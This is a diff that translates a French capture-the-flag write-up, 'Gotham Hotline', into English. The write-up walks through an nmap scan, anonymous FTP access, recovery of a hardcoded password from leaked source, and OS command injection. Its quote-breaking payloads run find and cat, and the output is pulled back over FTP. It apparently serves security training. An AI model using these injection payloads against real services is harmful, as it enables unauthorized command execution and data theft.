@@ -1,52 +1,52 @@
-# Write-up — Challenge "Gotham Hotline"
+# Write-up : Challenge "Gotham Hotline"
 
-**Cible** : `10.10.0.17`
+**Target**: `10.10.0.17`
 
-**Objectif** : Obtenir `user.txt`
+**Objective**: Get `user.txt`
 
-**Difficulté** : Easy
+**Difficulty**: Easy
 
-**Date** : 21/09/2026
+**Date**: 21/09/2026
 
-**Techniques utilisées** : Reconnaissance réseau, exploitation FTP anonyme, analyse de code source, injection de commande OS
+**Techniques used**: Network reconnaissance, anonymous FTP exploitation, source code analysis, OS command injection
 
-**Outils utilisés** : nmap, ftp, nc, python3
+**Tools used**: nmap, ftp, nc, python3
 
 ---
 
-## 1. Reconnaissance réseau (Nmap)
+## 1. Network reconnaissance (Nmap)
 
-**Commande :**
+**Command:**
 
 ```bash
 nmap -sC -sV -p- -T4 10.10.0.17
 ```
 
-**Pourquoi :** première étape systématique de tout pentest/CTF -> identifier les services exposés sur la machine cible pour savoir par où entrer.
+**Why:** the first systematic step of any pentest/CTF -> identify the services exposed on the target machine to know where to get in.
 
-**Résultat :** 3 ports ouverts
+**Result:** 3 open ports
 
-| Port     | Service        | Détails                                                            |
+| Port     | Service        | Details                                                            |
 | -------- | -------------- | ------------------------------------------------------------------ |
-| 21/tcp   | FTP            | vsftpd 3.0.5 — login anonyme autorisé                              |
+| 21/tcp   | FTP            | vsftpd 3.0.5: anonymous login allowed                               |
 | 22/tcp   | SSH            | OpenSSH 10.0p2 Debian                                              |
-| 3000/tcp | Service custom | "Gotham Hotline", bannière `🦇 Gotham Hotline: Identify yourself.` |
+| 3000/tcp | Custom service | "Gotham Hotline", banner `🦇 Gotham Hotline: Identify yourself.`   |
 
 ---
 
-## 2. Exploitation du FTP anonyme
+## 2. Anonymous FTP exploitation
 
-**Faille exploitée :** Accès FTP anonyme non restreint (CWE-284 : Improper Access Control) -> mauvaise configuration de service permettant l'authentification anonyme.
+**Vulnerability exploited:** Unrestricted anonymous FTP access (CWE-284: Improper Access Control) -> service misconfiguration allowing anonymous authentication.
 
 ```bash
 ftp 10.10.0.17
 ```
 
-Puis dans la session ftp :
+Then in the ftp session:
 
 ```
 Name: anonymous
-Password: [vide]
+Password: [empty]
 ls -la
 get alert.py
 cd logs
@@ -54,16 +54,16 @@ ls
 quit
 ```
 
-**Pourquoi ça a marché :** le serveur FTP acceptait les connexions anonymes, exposant un script Python (`alert.py`) ainsi qu'un dossier `logs/` avec permissions **777 (writeable par tous)**.
+**Why it worked:** the FTP server accepted anonymous connections, exposing a Python script (`alert.py`) as well as a `logs/` folder with **777 permissions (writable by everyone)**.
 
-**Fichiers/dossiers trouvés :**
+**Files/folders found:**
 
-- `alert.py` = code source du service tournant sur le port 3000
-- `logs/` = dossier accessible en écriture, contenant `report.txt`
+- `alert.py` = source code of the service running on port 3000
+- `logs/` = writable folder, containing `report.txt`
 
 ---
 
-## 3. Analyse du code source (`alert.py`)
+## 3. Source code analysis (`alert.py`)
 
 ```python
 #!/usr/bin/env python3
@@ -85,47 +85,47 @@ def handle_client(conn, addr):
         conn.send(b"Unauthorized signal. Transmission terminated.\n")
 ```
 
-**Failles identifiées :**
+**Vulnerabilities identified:**
 
-| #   | Faille                                                                    | Type / Catégorie                                    |
-| --- | ------------------------------------------------------------------------- | --------------------------------------------------- |
-| 1   | FTP anonyme + dossier `logs` en écriture pour tous                        | Mauvaise configuration / contrôle d'accès (CWE-284) |
-| 2   | Mot de passe applicatif en dur dans le code source                        | Exposition d'identifiants (CWE-798)                 |
-| 3   | Concaténation de l'entrée utilisateur dans `os.system()` sans échappement | Injection de commande OS (CWE-78)                   |
+| #   | Vulnerability                                                             | Type / Category                                      |
+| --- | -------------------------------------------------------------------------- | ----------------------------------------------------- |
+| 1   | Anonymous FTP + `logs` folder writable by everyone                        | Misconfiguration / access control (CWE-284)            |
+| 2   | Hardcoded application password in the source code                         | Credential exposure (CWE-798)                          |
+| 3   | Concatenation of user input into `os.system()` without escaping           | OS command injection (CWE-78)                          |
 
-Le mot de passe `G0th4mN33dsTh3B4t!` est en clair dans le script, et `alert_text` est inséré tel quel dans une commande shell entre guillemets simples. En injectant un `'` dans notre entrée, on ferme la citation shell en cours et on peut exécuter n'importe quelle commande arbitraire, avant de rouvrir un guillemet simple pour que la syntaxe de la commande `bash -c '...'` reste valide.
+The password `G0th4mN33dsTh3B4t!` is in plaintext in the script, and `alert_text` is inserted as-is into a shell command between single quotes. By injecting a `'` into our input, we close the current shell quoting and can execute any arbitrary command, before reopening a single quote so that the syntax of the `bash -c '...'` command remains valid.
 
 ---
 
-## 4. Exploitation / Injection de commande OS
+## 4. Exploitation / OS command injection
 
-### Connexion au service (port 3000)
+### Connecting to the service (port 3000)
 
 ```bash
 nc 10.10.0.17 3000
 ```
 
-### Authentification
+### Authentication
 
 ```
 G0th4mN33dsTh3B4t!
 ```
 
-### Payload — localisation du fichier `user.txt`
+### Payload - locating the `user.txt` file
 
 ```
 A'; find / -name user.txt 2>/dev/null > /opt/hotline/logs/report.txt; echo 'B
 ```
 
-**Pourquoi ça marche :** la commande finale exécutée côté serveur devient :
+**Why it works:** the final command executed server-side becomes:
 
 ```bash
 bash -c 'echo A'; find / -name user.txt 2>/dev/null > /opt/hotline/logs/report.txt; echo 'B > /opt/hotline/logs/report.txt'
 ```
 
-Le `find` s'exécute comme une commande shell indépendante, redirigeant sa sortie vers `report.txt`.
+The `find` executes as an independent shell command, redirecting its output to `report.txt`.
 
-### Récupération du résultat via FTP
+### Retrieving the result via FTP
 
 ```bash
 ftp 10.10.0.17
@@ -139,7 +139,7 @@ quit
 cat report.txt
 ```
 
-**Résultat :**
+**Result:**
 
 ```
 /home/bruce/user.txt
@@ -147,9 +147,9 @@ cat report.txt
 
 ---
 
-## 5. Lecture du flag
+## 5. Reading the flag
 
-Nouvelle connexion sur le port 3000 :
+New connection on port 3000:
 
 ```bash
 nc 10.10.0.17 3000
@@ -159,21 +159,21 @@ nc 10.10.0.17 3000
 G0th4mN33dsTh3B4t!
 ```
 
-Payload :
+Payload:
 
 ```
 A'; cat /home/bruce/user.txt > /opt/hotline/logs/report.txt; echo 'B
 ```
 
-Puis
+Then
 
-Récupération via FTP en allant dans le dossier logs (`cd logs`) puis (`get report.txt`), puis :
+Retrieval via FTP by going into the logs folder (`cd logs`) then (`get report.txt`), then:
 
 ```bash
 cat report.txt
 ```
 
-**FLAG obtenu :**
+**FLAG obtained:**
 
 ```
 EPI{1s_8ruc3_W4yn3_84tm4n?}
@@ -181,22 +181,22 @@ EPI{1s_8ruc3_W4yn3_84tm4n?}
 
 ---
 
-## Résumé des failles exploitées
+## Summary of exploited vulnerabilities
 
-| #   | Faille                                                                     | Type / Catégorie (CWE)                |
-| --- | -------------------------------------------------------------------------- | ------------------------------------- |
-| 1   | FTP anonyme activé                                                         | Contrôle d'accès défaillant (CWE-284) |
-| 2   | Dossier `logs` accessible en écriture pour tous                            | Permissions excessives (CWE-732)      |
-| 3   | Mot de passe applicatif en dur, lisible via le code source récupéré en FTP | Exposition d'identifiants (CWE-798)   |
-| 4   | Concaténation non filtrée dans `os.system()`                               | Injection de commande OS (CWE-78)     |
+| #   | Vulnerability                                                              | Type / Category (CWE)                 |
+| --- | -------------------------------------------------------------------------- | -------------------------------------- |
+| 1   | Anonymous FTP enabled                                                      | Broken access control (CWE-284)        |
+| 2   | `logs` folder writable by everyone                                         | Excessive permissions (CWE-732)        |
+| 3   | Hardcoded application password, readable via the source code retrieved over FTP | Credential exposure (CWE-798)     |
+| 4   | Unfiltered concatenation in `os.system()`                                  | OS command injection (CWE-78)          |
 
 ---
 
 ## Conclusion
 
-- **Accès initial :** exploitation du FTP anonyme -> récupération du code source `alert.py`, révélant un mot de passe applicatif en dur et une vulnérabilité d'injection de commande.
-- **Exploitation :** authentification sur le service "Gotham Hotline" (port 3000) puis injection de commande OS via l'entrée `alert_text` non échappée.
-- **Flag user :** `EPI{1s_8ruc3_W4yn3_84tm4n?}` obtenu après localisation puis lecture de `/home/bruce/user.txt`.
+- **Initial access:** exploitation of anonymous FTP -> retrieval of the `alert.py` source code, revealing a hardcoded application password and a command injection vulnerability.
+- **Exploitation:** authentication on the "Gotham Hotline" service (port 3000) then OS command injection via the unescaped `alert_text` input.
+- **User flag:** `EPI{1s_8ruc3_W4yn3_84tm4n?}` obtained after locating then reading `/home/bruce/user.txt`.
 
 ---
 
